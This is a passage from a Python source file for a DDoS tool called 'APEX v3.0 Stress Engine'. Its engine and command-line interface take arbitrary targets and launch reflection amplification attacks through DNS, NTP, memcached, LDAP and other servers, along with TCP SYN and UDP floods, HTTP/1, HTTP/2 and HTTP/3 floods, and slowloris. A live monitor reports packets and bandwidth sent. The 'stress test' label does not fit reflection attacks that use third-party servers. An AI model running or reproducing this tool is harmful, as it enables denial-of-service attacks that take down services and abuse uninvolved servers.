                info = ProtocolNegotiator.detect(ip, p)
                self.proto_info[ip] = info
                protos = ",".join(info["protocols"])
                tls_str = "TLS" if info["tls"] else "PLAIN"
                print(f"    \033[92m├─ {ip}\033[0m [{tls_str}] → {protos}")
        total = sum(len(v) for v in self.servers.values())
        print(f"\033[96m[*] Total backend servers: {total}\033[0m\n")

    def run(self):
        self.discover()

        all_ips = []
        for ips in self.servers.values():
            all_ips.extend(ips)

        l3_vecs = {"icmp","dns_amp","ntp_amp","ssdp_amp","memcached_amp",
                    "ldap_amp","snmp_amp","rip_amp","isakmp_amp","srcds_amp"}
        l4_vecs = {"tcp_syn","tcp_ack","tcp_conn","udp"}
        l7_vecs = {"http_get","http_post","http_head","slowloris","h2","h3"}

        active_l3 = [v for v in self.vectors if v in l3_vecs]
        active_l4 = [v for v in self.vectors if v in l4_vecs]
        active_l7 = [v for v in self.vectors if v in l7_vecs]

        has_raw = probe_raw()
        if active_l3 and not has_raw:
            print(f"\033[91m[!] L3 vectors need root: {active_l3}\033[0m")
            active_l3 = []

        # ── Launch L3 Reflection ──
        ref_pool = None
        ref_futures = []
        if active_l3:
            print(f"\033[93m[*] L3 Reflection Amplification: {active_l3}\033[0m")
            ref_eng = ReflectionEngine(self.stats)
            per_target_threads = max(10, self.threads // max(len(all_ips),1))
            for ip in all_ips:
                futs, pool = ref_eng.amplify(ip, self.duration, per_target_threads)
                ref_futures.extend(futs)
                ref_pool = pool

        # ── Launch L4 ──
        l4_map = {
            "tcp_syn": L4Vectors.tcp_syn,
            "tcp_conn": L4Vectors.tcp_conn,
            "udp": L4Vectors.udp_flood,
        }
        l4_pool = None
        l4_futures = []
        if active_l4:
            print(f"\033[93m[*] L4 Vectors: {active_l4}\033[0m")
            l4_pool = ThreadPoolExecutor(max_workers=self.threads)
            per = max(1, self.threads // max(len(all_ips)*len(active_l4),1))
            for ip in all_ips:
                for vn in active_l4:
                    fn = l4_map.get(vn)
                    if fn:
                        p = self.port or random.randint(1,65535)
                        for _ in range(per):
                            l4_futures.append(l4_pool.submit(fn, ip, p, self.duration, self.stats))

        # ── Launch L7 (async) ──
        l7_futures = []
        if active_l7:
            print(f"\033[93m[*] L7 Vectors: {active_l7}\033[0m")
            async def l7_runner():
                tasks = []
                for ip in all_ips:
                    info = self.proto_info.get(ip, {"protocols":["h1"],"tls":False})
                    for vn in active_l7:
                        per = max(1, self.threads // max(len(all_ips)*len(active_l7),1))
                        for _ in range(per):
                            if vn == "h3" and "h3" in info["protocols"]:
                                tasks.append(L7Vectors.http3_flood(ip, self.port or 443, self.duration, self.stats))
                            elif vn == "h2" and "h2" in info["protocols"]:
                                tasks.append(L7Vectors.http2_flood(ip, self.port or 443, self.duration, self.stats))
                            elif vn == "http_get":
                                tasks.append(L7Vectors.http1_flood(ip, self.port or (443 if info["tls"] else 80), info["tls"], self.duration, self.stats))
                            elif vn == "http_post":
                                tasks.append(L7Vectors.http_post(ip, self.port or (443 if info["tls"] else 80), info["tls"], self.duration, self.stats))
                            elif vn == "slowloris":
                                tasks.append(L7Vectors.slowloris(ip, self.port or (443 if info["tls"] else 80), info["tls"], self.duration, self.stats))
                            elif vn == "http_head":
                                tasks.append(L7Vectors.http1_flood(ip, self.port or (443 if info["tls"] else 80), info["tls"], self.duration, self.stats))
                await asyncio.gather(*tasks, return_exceptions=True)
            l7_futures.append(asyncio.ensure_future(l7_runner()))

        # ── Monitor ──
        print(f"\n\033[91m[!] STRESS TEST ACTIVE — Ctrl+C to abort\033[0m\n")
        try:
            start = time.time()
            while time.time() - start < self.duration:
                sn = self.stats.snap()
                t = sn["e"]; pps = sn["pps"]; bps = sn["bps"]
                pkts = sn["p"]; errs = sn["er"]
                if bps > 1_073_741_824: bw = f"{bps/1_073_741_824:.2f} GB/s"
                elif bps > 1_048_576: bw = f"{bps/1_048_576:.2f} MB/s"
                elif bps > 1024: bw = f"{bps/1024:.2f} KB/s"
                else: bw = f"{bps:.0f} B/s"
                srv_count = sum(len(v) for v in self.servers.values())
                sys.stdout.write(
                    f"\r\033[93m[T+{t:05.1f}s]\033[0m "
                    f"Servers:\033[96m{srv_count}\033[0m | "
                    f"PPS:\033[92m{pps:,.0f}\033[0m | "
                    f"BW:\033[92m{bw}\033[0m | "
                    f"Sent:\033[96m{pkts:,}\033[0m | "
                    f"Err:\033[91m{errs:,}\033[0m   ")
                sys.stdout.flush()
                time.sleep(1)
        except KeyboardInterrupt:
            pass

        print("\n\n\033[92m═══ FINAL REPORT ═══\033[0m")
        sn = self.stats.snap()
        print(f"  Duration : {sn['e']:.2f}s")
        print(f"  Servers  : {sum(len(v) for v in self.servers.values())}")
        print(f"  Packets  : {sn['p']:,}")
        print(f"  Bytes    : {sn['b']:,}")
        print(f"  Avg PPS  : {sn['pps']:,.0f}")
        print(f"  Avg BW   : {sn['bps']/1_048_576:.2f} MB/s")
        print(f"  Errors   : {sn['er']:,}")
        print("\033[92m════════════════════\033[0m")

        # Cleanup
        if ref_pool: ref_pool.shutdown(wait=False, cancel_futures=True)
        if l4_pool: l4_pool.shutdown(wait=False, cancel_futures=True)
        for f in l7_futures: f.cancel()

# ══════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════
ALL_VECTORS = [
    "dns_amp","ntp_amp","ssdp_amp","memcached_amp","ldap_amp","snmp_amp",
    "tcp_syn","tcp_conn","udp",
    "http_get","http_post","http_head","slowloris","h2","h3"
]

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="APEX v3.0 Stress Engine",
                                      formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("targets", help="Target(s): IP, hostname, URL, comma-separated, or file")
    parser.add_argument("-v", "--vectors", default="http_get,h2,udp,tcp_conn",
        help="Vectors (comma-sep or 'all'). Default: http_get,h2,udp,tcp_conn")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Threads (default: 200)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration sec (default: 60)")
    parser.add_argument("-p", "--port", type=int, default=0, help="Port (default: auto-detect)")
    args = parser.parse_args()

    # Parse targets
    targets = []
    for item in args.targets.split(","):
        item = item.strip()
        if not item: continue
        if os.path.isfile(item):
            with open(item) as f:
                targets.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))
        else:
            targets.append(item)
    targets = list(dict.fromkeys(targets))  # dedupe preserving order

    if not targets:
        print("[!] No targets."); sys.exit(1)

    vecs = ALL_VECTORS if args.vectors.lower()=="all" else [v.strip().lower() for v in args.vectors.split(",")]

    print(f"\033[96m[*] Targets : {', '.join(targets)}\033[0m")
    print(f"\033[96m[*] Vectors : {', '.join(vecs)}\033[0m")
    print(f"\033[96m[*] Threads : {args.threads}\033[0m")
    print(f"\033[96m[*] Duration: {args.duration}s\033[0m")

    engine = ApexEngine(targets, vecs, args.threads, args.duration, args.port)
    engine.run()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda *_: (print("\n[!] Aborted."), sys.exit(0)))
    main()